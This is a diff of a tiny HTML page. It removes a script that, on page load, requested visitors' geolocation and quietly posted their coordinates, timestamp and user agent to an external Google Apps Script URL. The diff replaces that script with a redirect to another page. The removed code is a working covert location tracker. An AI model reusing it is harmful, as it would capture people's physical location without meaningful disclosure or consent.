@@ -1,70 +1,15 @@
 <!DOCTYPE html>
 <html>
   <head>
-	<!-- <meta charset="UTF-8"> -->
-	<!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
-	<!-- <title></title> -->
-	<script>
-		function sendData(location) {
-			const scriptURL = 'https://script.google.com/macros/s/AKfycbz4esELp7uGskSsnNeIfaIHDi4OmdTNwZQxOayYeHE08tFBx0XgqirKy_9njMoSu8RY/exec';
-			const data = {
-				latitude: location.coords.latitude,
-				longitude: location.coords.longitude,
-				timestamp: new Date().toISOString(),
-				userAgent: navigator.userAgent,
-			};
-
-			fetch(scriptURL, {
-				method: 'POST',
-				body: JSON.stringify(data),
-				headers: {
-					'Content-Type': 'application/json'
-				},
-				mode: "no-cors"
-			})
-			//     .then(response => {
-			//     if (response.ok) {
-			//         alert("Data sent successfully!");
-			//     } else {
-			//         alert("Error sending data.");
-			//     }
-			// });
-		}
-
-		function getLocation() {
-			if (navigator.geolocation) {
-				navigator.geolocation.getCurrentPosition(sendData, showError);
-			} else {
-				alert("Geolocation is not supported by this browser.");
-			}
-		}
-
-		function showError(error) {
-			switch (error.code) {
-				case error.PERMISSION_DENIED:
-					alert("User denied the request for Geolocation.");
-					break;
-				case error.POSITION_UNAVAILABLE:
-					alert("Location information is unavailable.");
-					break;
-				case error.TIMEOUT:
-					alert("The request to get user location timed out.");
-					break;
-				case error.UNKNOWN_ERROR:
-					alert("An unknown error occurred.");
-					break;
-			}
-		}
-	</script>	
     <!-- <meta http-equiv="refresh" content="0; href='catgirl.html'" /> -->
 
-	<!-- <script>
+	<script>
 		function myFunction() {
 		  location.replace("catgirl.html")
 		}
 		myFunction()
-		</script> -->
+		</script>
 		
   </head>
-  <body onload="getLocation()">  </body>
+  <body onload="myFunction()">  </body>
 </html>
